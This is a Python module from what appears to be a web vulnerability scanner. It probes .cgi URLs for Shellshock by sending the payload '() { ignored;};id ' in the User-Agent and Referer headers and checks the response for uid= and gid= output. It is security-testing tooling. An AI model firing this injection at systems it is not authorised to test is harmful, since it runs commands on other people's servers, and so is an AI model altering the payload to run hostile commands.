import requests
try:
    import urlparse
except ImportError:
    import urllib.parse as urlparse
import helios.modules.module_base
from helios.core.utils import requests_response_to_dict


class Module(helios.modules.module_base.Base):

    def __init__(self):
        self.name = "Shellshock"
        self.input = "urls"
        self.injections = {}
        self.module_types = ['injection']
        self.possibilities = [
            '.cgi'
        ]
        self.output = "vulns"
        self.severity = 3

    def run(self, urls, headers={}, cookies={}):
        results = []
        list_urls = []
        self.cookies = cookies
        for u in urls:
            if u[0].split('?')[0] not in list_urls:
                list_urls.append(u[0].split('?')[0])
        for f in list_urls:
            for p in self.possibilities:
                if p in f:
                    result = self.test(f)
                    if result:
                        results.append(result)
        return results

    def test(self, url):
        payload = {
            'User-Agent': '() { ignored;};id ',
            'Referer': '() { ignored;};id '
        }
        result = self.send(url, headers=payload)
        if result and 'gid=' in result.text and 'uid=' in result.text:
            result_obj = {'request': requests_response_to_dict(result), "match": "Command was executed on server"}
            return result_obj
        return None

    def send(self, url, headers={}):
        result = None
        cookies = self.cookies
        try:
            result = requests.get(url, headers=headers, cookies=cookies)
        except Exception as e:
           pass
        return result
